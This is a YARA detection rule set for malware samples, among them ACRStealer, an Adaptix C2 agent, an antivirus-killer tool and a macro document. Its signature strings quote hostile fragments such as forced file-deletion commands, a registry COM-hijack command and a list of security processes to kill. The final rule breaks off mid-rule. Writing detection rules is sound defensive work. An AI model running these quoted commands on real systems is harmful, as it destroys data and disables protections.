/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-26
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_81b187eca349978e3078c7638f065375_imphash_ {
   meta:
      description = "_subset_batch - file 81b187eca349978e3078c7638f065375(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6bab3b1615f610dc7d2649d90dda6776b7ff881ee611a288aad313ebe19871f5"
   strings:
      $s1 = "Clipper.dll" fullword ascii /* score: '23.00'*/
      $s2 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s3 = "?ReflectiveLoader@@YA_KXZ" fullword ascii /* score: '13.00'*/
      $s4 = "ReflectiveLoader" fullword ascii /* score: '13.00'*/
      $s5 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s6 = "dsofjsdopifjsdoipfjxx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule sig_97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb8 {
   meta:
      description = "_subset_batch - file 97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614"
   strings:
      $s1 = " Y=0x0,N,G,n=0x0;G=X['charAt'](n++);~G&&(N=Y%0x4?N*0x40+G:G,Y++%0x4)?f+=String['fromCharCode'](0xff&N>>(-0x2*Y&0x6)):0x0){G=P['i" ascii /* score: '9.00'*/
      $s2 = "(function(W,D){var G=i,a=W();while(!![]){try{var V=parseInt(G(0x150,'BHVk'))/0x1*(parseInt(G(0x30b,'w0Ul'))/0x2)+-parseInt(G(0x1" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 70KB and
      all of them
}

rule sig_81b187eca349978e3078c7638f065375_imphash__cabf6539 {
   meta:
      description = "_subset_batch - file 81b187eca349978e3078c7638f065375(imphash)_cabf6539.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "cabf6539957298003b272e5f26aac3206a296a2e553ccc98491a2a3b817be50f"
   strings:
      $s1 = "Clipper.dll" fullword ascii /* score: '23.00'*/
      $s2 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s3 = "?ReflectiveLoader@@YA_KXZ" fullword ascii /* score: '13.00'*/
      $s4 = "ReflectiveLoader" fullword ascii /* score: '13.00'*/
      $s5 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s6 = "dsofjsdopifjsdoipfjxx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule ACRStealer_signature__be62e7527c28574682b9e1414fa46358_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_be62e7527c28574682b9e1414fa46358(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "542777a1beae1000bf1382230e99aebb0b232e6fd1e750a2ab66ebfa8c55212d"
   strings:
      $s1 = "@Madtools@GetFileVersionStr$qqrx27System@%AnsiStringT$us$i0$%" fullword ascii /* score: '15.00'*/
      $s2 = "@Madtools@GetFileVersion$qqrx27System@%AnsiStringT$us$i0$%" fullword ascii /* score: '15.00'*/
      $s3 = "@Madtools@GetFileVersion$qqrx20System@UnicodeString" fullword ascii /* score: '15.00'*/
      $s4 = "@Madtools@GetFileVersionStr$qqrx20System@UnicodeString" fullword ascii /* score: '15.00'*/
      $s5 = "@Madzip@GetCompressedFileInfo$qqrx20System@UnicodeStringrjrui" fullword ascii /* score: '15.00'*/
      $s6 = "@Madzip@GetUncompressedFileInfo$qqrx20System@UnicodeStringrjrui" fullword ascii /* score: '15.00'*/
      $s7 = "madBasic 1.2.5  -  www.madshi.net" fullword wide /* score: '15.00'*/
      $s8 = "-http://crl4.digicert.com/EVCodeSigning-g1.crl0K" fullword ascii /* score: '13.00'*/
      $s9 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s10 = "-http://crl3.digicert.com/EVCodeSigning-g1.crl03" fullword ascii /* score: '13.00'*/
      $s11 = "7http://cacerts.digicert.com/DigiCertEVCodeSigningCA.crt0" fullword ascii /* score: '13.00'*/
      $s12 = "@Madtools@GetShortFileName$qqr20System@UnicodeString" fullword ascii /* score: '12.00'*/
      $s13 = "@Madbasic@TIBasic@GetSelected$qqrx53System@%DelphiInterface$t25Madbasic@ICustomBasicList%" fullword ascii /* score: '12.00'*/
      $s14 = "@Madstrings@PosTextIs1$qqrx20System@UnicodeStringt1" fullword ascii /* score: '12.00'*/
      $s15 = "@Madcrypt@OldEncrypt$qqrpvuix27System@%AnsiStringT$us$i0$%" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule sig_9c1801bc6a530343479ed8825597a512349c68451c6ccab08596036fec222ee0_9c1801bc {
   meta:
      description = "_subset_batch - file 9c1801bc6a530343479ed8825597a512349c68451c6ccab08596036fec222ee0_9c1801bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9c1801bc6a530343479ed8825597a512349c68451c6ccab08596036fec222ee0"
   strings:
      $x1 = "CefSharp.BrowserSubprocess.Core.dll" fullword wide /* score: '34.00'*/
      $x2 = "CefSharp.BrowserSubprocess.dll" fullword wide /* score: '34.00'*/
      $x3 = "C:\\Users\\lukea\\Documents\\GitHub\\WaveBootstrapper\\obj\\Release\\net9.0-windows\\win-x64\\WaveBootstrapper.pdb" fullword ascii /* score: '33.00'*/
      $x4 = "CefSharp.BrowserSubprocess.exe" fullword wide /* score: '33.00'*/
      $s5 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s6 = "Ijwhost.dll" fullword wide /* score: '28.00'*/
      $s7 = "aSystem.Windows.Controls.Ribbon, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s8 = "NSystem.Xaml, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s9 = "CefSharp.Core.Runtime.dll" fullword wide /* score: '26.00'*/
      $s10 = "dxcompiler.dll" fullword wide /* score: '26.00'*/
      $s11 = "This executable is not bound to a managed DLL to execute. The binding value is: '%s'" fullword wide /* score: '25.00'*/
      $s12 = "`System.Object, System.Runtime, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '24.00'*/
      $s13 = "WaveBootstrapper.dll" fullword wide /* score: '23.00'*/
      $s14 = "Copyright 2016 The Inter Project AuthorsInter ExtraLightRegular4.001;git-9221beed3;RSMS;Inter-ExtraLightInter ExtraLightVersion " wide /* score: '23.00'*/
      $s15 = "<Copyright 2016 The Inter Project AuthorsInter ExtraLightItalic4.001;git-9221beed3;RSMS;Inter-ExtraLightItalicInter ExtraLight I" wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 24000KB and
      1 of ($x*) and all of them
}

rule ACRStealer_signature__2676191f0a576ada6a308b22b8381784_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_2676191f0a576ada6a308b22b8381784(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "cb0d9875c399152991935581207b9b742762ee282171a28572676c9896a5712f"
   strings:
      $s1 = "Microsoft.DiaSymReader.Native.x86.dll" fullword wide /* score: '26.00'*/
      $s2 = "* CompilerInfo *" fullword wide /* score: '17.00'*/
      $s3 = "* Portable PDB *" fullword wide /* score: '15.00'*/
      $s4 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s5 = " ** Version : %u (0x%08X)" fullword wide /* score: '11.00'*/
      $s6 = "Microsoft.DiaSymReader.Native.x86" fullword ascii /* score: '10.00'*/
      $s7 = "Cloumclelhos.gki" fullword ascii /* score: '10.00'*/
      $s8 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s9 = " Microsoft Operations Puerto Rico1" fullword ascii /* score: '9.00'*/
      $s10 = "2!2/252A2d2{2" fullword ascii /* score: '9.00'*/ /* hex encoded string '"%*-"' */
      $s11 = " Microsoft Operations Puerto Rico1&0$" fullword ascii /* score: '9.00'*/
      $s12 = "4*4.42464:4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'DBFD' */
      $s13 = "3$4(455=5" fullword ascii /* score: '9.00'*/ /* hex encoded string '4EU' */
      $s14 = "%d%s (ordinal)" fullword ascii /* score: '8.00'*/
      $s15 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule ACRStealer_signature__4d9bf67a7f4323179e1505deb584b94c_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_4d9bf67a7f4323179e1505deb584b94c(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "dd3dde736c10e1ac16d98224e0a531d2a819e7d1073d996a2074896dedc626df"
   strings:
      $s1 = "E:\\BuildAgent\\work\\651b8e202d473190\\.build\\win-vc140-x64\\bin\\RelWithDebInfo\\hdmengine_sche.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "hdmengine_scriptsapp.exe" fullword wide /* score: '25.00'*/
      $s3 = "<QueryList><Query Id=\"0\" Path=\"Microsoft-Windows-DriverFrameworks-UserMode/Operational\"><Select Path=\"Microsoft-Windows-Dri" wide /* score: '21.00'*/
      $s4 = "hdmengine_sche.dll" fullword ascii /* score: '20.00'*/
      $s5 = "hdmengine_schelauncher.exe" fullword wide /* score: '19.00'*/
      $s6 = "Run at user logon, every %1% day(s)" fullword ascii /* score: '15.00'*/
      $s7 = "Run at user logon" fullword ascii /* score: '15.00'*/
      $s8 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0" fullword ascii /* score: '13.00'*/
      $s9 = "Cannot get exec action" fullword ascii /* score: '13.00'*/
      $s10 = "%1% Delete the task after execution." fullword ascii /* score: '12.00'*/
      $s11 = "The Task Scheduler windows service is either disabled or missing in the system." fullword ascii /* score: '10.00'*/
      $s12 = ".?AVerror_com@?A0xe34ebeea@@" fullword ascii /* score: '10.00'*/
      $s13 = "bad script_len" fullword ascii /* score: '10.00'*/
      $s14 = "COM error 0x%X" fullword ascii /* score: '10.00'*/
      $s15 = "error_com" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule sig_8ecc0dcaaff64a3c02e2125981dcf38d_imphash_ {
   meta:
      description = "_subset_batch - file 8ecc0dcaaff64a3c02e2125981dcf38d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d668fd0963491a27dcd57980fe42eef14d202f7299863cc1f264dceceab203bf"
   strings:
      $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s2 = "rpp_dl_31.dll" fullword ascii /* score: '17.00'*/
      $s3 = "http://ocsps.ssl.com0?" fullword ascii /* score: '17.00'*/
      $s4 = "https://www.ssl.com/repository0" fullword ascii /* score: '17.00'*/
      $s5 = "http://ocsps.ssl.com0" fullword ascii /* score: '17.00'*/
      $s6 = "!SSL.com Timestamping Unit 2024 E10Y0" fullword ascii /* score: '17.00'*/
      $s7 = "5http://cert.ssl.com/SSL.com-timeStamping-I-RSA-R1.cer0Q" fullword ascii /* score: '17.00'*/
      $s8 = "http://ocsps.ssl.com0P" fullword ascii /* score: '17.00'*/
      $s9 = ">http://www.ssl.com/repository/SSLcom-RootCA-EV-RSA-4096-R2.crt0 " fullword ascii /* score: '16.00'*/
      $s10 = "(SSL.com Root Certification Authority RSA0" fullword ascii /* score: '16.00'*/
      $s11 = "*http://crls.ssl.com/ssl.com-rsa-RootCA.crl0" fullword ascii /* score: '16.00'*/
      $s12 = ".SSL.com EV Root Certification Authority RSA R20" fullword ascii /* score: '16.00'*/
      $s13 = "4http://crls.ssl.com/SSLcom-RootCA-EV-RSA-4096-R2.crl0" fullword ascii /* score: '16.00'*/
      $s14 = "?http://cert.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.cer0 " fullword ascii /* score: '13.00'*/
      $s15 = "&SSL.com Timestamping Issuing RSA CA R10" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule ACRStealer_signature__1f6e9a453f6883eecb41c0344d901110_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_1f6e9a453f6883eecb41c0344d901110(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d8b9904ba98e763e6a208994256d01b51311be06476554bf2d967ddd891adee5"
   strings:
      $x1 = "Configuration. RandomizeScene:%ld AutoGoto:%ld RunTime:%ld-%ld CaptureSound:%ld CaptureRecordingDevice:%ld MaxSilence:%ld Transi" ascii /* score: '31.00'*/
      $s2 = "tionTime:%.2f ScaleFrom:%0.2f ScaleTo:%0.2f PostProcessingProbability: %0.2f Preloader: %ld LayerScenesInVR:%d PreferOpenVR:%ld" fullword ascii /* score: '28.00'*/
      $s3 = "%lsLibOVRRT%hs_%d.dll" fullword wide /* score: '27.00'*/
      $s4 = "C:\\teamcityagent\\work\\plane9_v2.5.1\\build\\Plane9Engine.pdb" fullword ascii /* score: '25.00'*/
      $s5 = "A texture that contains the previous rendered layer (Background and/or foreground layers combined). This node only works in back" ascii /* score: '23.00'*/
      $s6 = "Plane9Engine.dll" fullword ascii /* score: '23.00'*/
      $s7 = "quazip.dll" fullword ascii /* score: '23.00'*/
      $s8 = "CrashRpt1402.dll" fullword ascii /* score: '23.00'*/
      $s9 = "logconfig.txt" fullword ascii /* score: '22.00'*/
      $s10 = "ground and postprocessing scenes" fullword ascii /* score: '22.00'*/
      $s11 = "/Plane9.Config.exe" fullword wide /* score: '22.00'*/
      $s12 = "errors@plane9.com" fullword ascii /* score: '21.00'*/
      $s13 = "This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License. To view a copy of th" wide /* score: '21.00'*/
      $s14 = "This work is licensed under the Creative Commons Attribution-ShareAlike 3.0 Unported License. To view a copy of this license, vi" wide /* score: '21.00'*/
      $s15 = "This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 4.0 Unported License. To view a copy of th" wide /* score: '21.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__263b9fc008b31d881ecd175998ec5ca4_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_263b9fc008b31d881ecd175998ec5ca4(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1a5e37466d7764f45c694662cd1e4ed3c959b993ae5230410a8f6de9bc426597"
   strings:
      $x1 = "packager.dll" fullword ascii /* reversed goodware string 'lld.regakcap' */ /* score: '33.00'*/
      $s2 = "jre\\bin\\client\\jvm.dll" fullword wide /* score: '25.00'*/
      $s3 = "jre\\bin\\server\\jvm.dll" fullword wide /* score: '25.00'*/
      $s4 = "MSVCR.*.DLL" fullword wide /* score: '20.00'*/
      $s5 = "Error: Unable to create process %s" fullword wide /* score: '18.00'*/
      $s6 = "jvmuserargs.cfg" fullword wide /* score: '17.00'*/
      $s7 = "_Java_jdk_packager_services_userjvmoptions_LauncherUserJvmOptions__1getUserJvmOptionKeys@8" fullword ascii /* score: '15.00'*/
      $s8 = ".?AVWindowsProcess@@" fullword ascii /* score: '15.00'*/
      $s9 = "_Java_jdk_packager_services_userjvmoptions_LauncherUserJvmOptions__1getUserJvmOptionDefaultValue@12" fullword ascii /* score: '15.00'*/
      $s10 = "_Java_jdk_packager_services_userjvmoptions_LauncherUserJvmOptions__1getUserJvmOptionValue@12" fullword ascii /* score: '15.00'*/
      $s11 = "_Java_jdk_packager_services_userjvmoptions_LauncherUserJvmOptions__1getUserJvmOptionDefaultKeys@8" fullword ascii /* score: '15.00'*/
      $s12 = "CONFIG_SECTION_JVMUSEROVERRIDESOPTIONS" fullword wide /* score: '15.00'*/
      $s13 = "package.cfg" fullword wide /* score: '14.00'*/
      $s14 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii /* score: '13.00'*/
      $s15 = "failed.creating.jvm" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_97b61b6f1c2730ee8f1ac6aadbfe10d7_imphash_ {
   meta:
      description = "_subset_batch - file 97b61b6f1c2730ee8f1ac6aadbfe10d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e0464215b4d096fa0b27cd34d5e6b15dd6ea7f71a9bce837938a23fd7c8beb36"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:v3=\"urn:schemas-microsoft-com:asm.v3\"><asse" ascii /* score: '48.00'*/
      $x2 = "Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language" ascii /* score: '39.00'*/
      $s3 = "Target process not found." fullword wide /* score: '25.00'*/
      $s4 = "https://autohotkey.com" fullword wide /* score: '24.00'*/
      $s5 = "3:requestedPrivileges><v3:requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /></v3:requestedPrivileges></v3:securit" ascii /* score: '23.00'*/
      $s6 = "IND)ind)mscoree.dll" fullword wide /* score: '20.00'*/
      $s7 = "ProcessGetName" fullword wide /* score: '20.00'*/
      $s8 = "ProcessGetParent" fullword wide /* score: '20.00'*/
      $s9 = "ProcessGetPath" fullword wide /* score: '20.00'*/
      $s10 = "WinGetProcessName" fullword wide /* score: '20.00'*/
      $s11 = "WinGetProcessPath" fullword wide /* score: '20.00'*/
      $s12 = "Could not open URL https://autohotkey.com in default browser." fullword wide /* score: '20.00'*/
      $s13 = "<response command=\"typemap_get\" transaction_id=\"%e\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http" ascii /* score: '18.00'*/
      $s14 = "<response command=\"typemap_get\" transaction_id=\"%e\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http" ascii /* score: '18.00'*/
      $s15 = "<response command=\"feature_get\" feature_name=\"%e\" supported=\"%i\" transaction_id=\"%e\">%s</response>" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule sig_980e58c20a9e09a20bf1c48596823663_imphash_ {
   meta:
      description = "_subset_batch - file 980e58c20a9e09a20bf1c48596823663(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3f350c326ac05b7175095362fe9d461705fa947d08a83c0336f2db57b02f0f61"
   strings:
      $s1 = "AYAYAYAY" fullword ascii /* reversed goodware string 'YAYAYAYA' */ /* score: '16.50'*/
      $s2 = "FZXIyfEpY" fullword ascii /* base64 encoded string 'er2|JX' */ /* score: '14.00'*/
      $s3 = "GdVNtXmNF" fullword ascii /* base64 encoded string 'uSm^cE' */ /* score: '14.00'*/
      $s4 = "rPXJNJmJx" fullword ascii /* base64 encoded string '=rM&bq' */ /* score: '14.00'*/
      $s5 = "AXAXAX" fullword ascii /* reversed goodware string 'XAXAXA' */ /* score: '13.50'*/
      $s6 = "CommandLineToArg" fullword ascii /* score: '12.00'*/
      $s7 = "EnumSystemFirmwaGetSystemFirmwar" fullword ascii /* score: '12.00'*/
      $s8 = "https://www.baidntdll.dl" fullword wide /* score: '12.00'*/
      $s9 = "dnxPoTyLPdGEtSsrP" fullword ascii /* score: '9.00'*/
      $s10 = "tdgEtULPOLHE" fullword ascii /* score: '9.00'*/
      $s11 = "iNFTPsElYYoHxhgIJxdSPo" fullword ascii /* score: '9.00'*/
      $s12 = "shell32." fullword wide /* score: '9.00'*/
      $s13 = "vyfffff" fullword ascii /* score: '8.00'*/
      $s14 = "zqgaawy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule sig_940b084c27fa17a44f3db52d47b22174f291310b4795c116adafff435749ff18_940b084c {
   meta:
      description = "_subset_batch - file 940b084c27fa17a44f3db52d47b22174f291310b4795c116adafff435749ff18_940b084c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "940b084c27fa17a44f3db52d47b22174f291310b4795c116adafff435749ff18"
   strings:
      $s1 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s2 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s3 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Adapti_C2_signature__cec26e7a0d03942ef45bd38e04fadffa_imphash_ {
   meta:
      description = "_subset_batch - file Adapti-C2(signature)_cec26e7a0d03942ef45bd38e04fadffa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "40951361281882b7d1794d86d065d7d587ba25abbb2caa8c8a9b454b6ee16234"
   strings:
      $s1 = "AadAuthHelper.dll" fullword ascii /* score: '26.00'*/
      $s2 = "libadaptix_agent.dll" fullword ascii /* score: '25.00'*/
      $s3 = "GetTraceLoggerHand" fullword wide /* score: '19.00'*/
      $s4 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s5 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s6 = ".?AU?$IAsyncOperat" fullword wide /* score: '14.00'*/
      $s7 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s8 = "zockeygen_sign_agent_request" fullword ascii /* score: '12.00'*/
      $s9 = "Failed to get prox" fullword ascii /* score: '12.00'*/
      $s10 = "GetSystemTimeAsFil" fullword ascii /* score: '12.00'*/
      $s11 = "zockeygen_privkey_from_agentrequest_with_blob" fullword ascii /* score: '12.00'*/
      $s12 = "unsupported_grant_" fullword ascii /* score: '12.00'*/
      $s13 = "GetCredentialKeys" fullword wide /* score: '12.00'*/
      $s14 = "connection_refused" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s15 = "GetSND failed" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule sig_996e28b2fa39d54b2c74d0f63fe0b800_imphash_ {
   meta:
      description = "_subset_batch - file 996e28b2fa39d54b2c74d0f63fe0b800(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4ca6c56e64314eac2caac2dd09f8c54379309dfac20a02cfb9a1742b2ea268ce"
   strings:
      $s1 = "waitforsingleobject" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule sig_8f049b3a100747167eb87fb3a134e446d9057f179b4f334a5a4006369605095a_8f049b3a {
   meta:
      description = "_subset_batch - file 8f049b3a100747167eb87fb3a134e446d9057f179b4f334a5a4006369605095a_8f049b3a.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8f049b3a100747167eb87fb3a134e446d9057f179b4f334a5a4006369605095a"
   strings:
      $x1 = "%systemroot%\\System32\\version.dll" fullword wide /* score: '35.00'*/
      $x2 = "prnfldr.dll" fullword ascii /* reversed goodware string 'lld.rdlfnrp' */ /* score: '33.00'*/
      $x3 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '32.00'*/
      $x4 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $s5 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s6 = "%windir%\\system32\\reg.exe" fullword wide /* score: '27.00'*/
      $s7 = "VERSION.dll" fullword wide /* score: '26.00'*/
      $s8 = " add \"HKCU\\Software\\Classes\\CLSID\\{2227A280-3AEA-1069-A2DE-08002B30309D}\\InProcServer32\" /f /reg:64 /v \"\" /t REG_EXPAND" wide /* score: '24.00'*/
      $s9 = "\\taskkill.exe /f /IM " fullword wide /* score: '24.00'*/
      $s10 = "%programdata%\\prnfldr.dll" fullword wide /* score: '24.00'*/
      $s11 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide /* score: '24.00'*/
      $s12 = "VBE7.DLL" fullword ascii /* score: '20.00'*/
      $s13 = "\\taskkill.exe" fullword wide /* score: '20.00'*/
      $s14 = "ExecuteY" fullword ascii /* score: '18.00'*/
      $s15 = "%localappdata%\\windows.png" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_95b471a1955878f7c0f34ed11850361a_imphash_ {
   meta:
      description = "_subset_batch - file 95b471a1955878f7c0f34ed11850361a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1165ae14aac27c4ea56f08f713ea2b3d0f4e26ec15bde9f21d594bc21c20e755"
   strings:
      $x1 = "cmd.exe /c timeout 3 >nul" fullword ascii /* score: '36.00'*/
      $x2 = "cmd.exe /c rmdir /s /q \"" fullword wide /* score: '36.00'*/
      $x3 = "C:\\Users\\dilan\\source\\repos\\antiv crack made by dilanas\\x64\\Release\\antiv crack made by dilanas.pdb" fullword ascii /* score: '33.00'*/
      $x4 = "cmd.exe /c del /f /q \"" fullword wide /* score: '33.00'*/
      $s5 = "MsMpCmdRun.exe" fullword wide /* score: '28.00'*/
      $s6 = "bdagent.exe" fullword wide /* score: '27.00'*/
      $s7 = "SecurityHealthService.exe" fullword wide /* score: '25.00'*/
      $s8 = "MBAMService.exe" fullword wide /* score: '25.00'*/
      $s9 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s10 = "gMsMpEng.exe" fullword wide /* score: '22.00'*/
      $s11 = "NisSrv.exe" fullword wide /* score: '22.00'*/
      $s12 = "SecurityHealthSystray.exe" fullword wide /* score: '22.00'*/
      $s13 = "mbamtray.exe" fullword wide /* score: '22.00'*/
      $s14 = "MBAMScheduler.exe" fullword wide /* score: '22.00'*/
      $s15 = "MBAM.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and all of them
}

rule sig_939df283fb6cc92650c55cdf9c8666aae1f46b8b058484f9da6f56689cd8c980_939df283 {
   meta:
      description = "_subset_batch - file 939df283fb6cc92650c55cdf9c8666aae1f46b8b058484f9da6f56689cd8c980_939df283.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "939df283fb6cc92650c55cdf9c8666aae1f46b8b058484f9da6f56689cd8c980"
   strings:
      $x1 = "peer closed connection without sending TLS close_notify: https://docs.rs/rustls/latest/rustls/manual/_03_howto/index.html#unexpe" ascii /* score: '58.00'*/
      $x2 = "q}ConnectFailedIoMissingHostProxyAuthRequiredProxyHeadersTooLongTunnelUnexpectedEofTunnelUnsuccessfuldns errorFieldSet corrupted" ascii /* score: '53.00'*/
      $x3 = "FieldSet corrupted (this is a bug)raw body size: encoded size: post failed with status: post successful: status=post request err" ascii /* score: '49.00'*/
      $x4 = "description() is deprecated; use DisplayMaxSizeReachedrequested capacity  too large: overflow while converting to raw capacity<u" ascii /* score: '48.00'*/
      $x5 = "pathsleep_msFieldSet corrupted (this is a bug)starting agent sessionmetadata preparedperforming first blood handshakeunexpected " ascii /* score: '42.00'*/
      $x6 = "ExtensionTypeServerNameMaxFragmentLengthClientCertificateUrlTrustedCAKeysTruncatedHMACStatusRequestUserMappingClientAuthzServerA" ascii /* score: '35.00'*/
      $x7 = "first blood statusfirst blood request failed: failed to process command response: exit command acknowledged; terminating session" ascii /* score: '34.00'*/
      $x8 = "command data incompleteplaintext length insufficientplaintext too short for parsingHMAC verification faileddecoded data too shor" ascii /* score: '34.00'*/
      $x9 = "Thread count overflowed the configured max count. Thread index = .a shard can only be inserted by the thread that owns it, this " ascii /* score: '33.00'*/
      $x10 = "ParseIncompleteMessageUnexpectedMessageChannelClosedIoBodyWriteMethodVersionVersionH2UriHeaderStatusTokenContentLengthInvalidTra" ascii /* score: '33.00'*/
      $x11 = "a formatting trait implementation returned an error when the underlying stream did notfailed to write whole bufferinternal error" ascii /* score: '32.00'*/
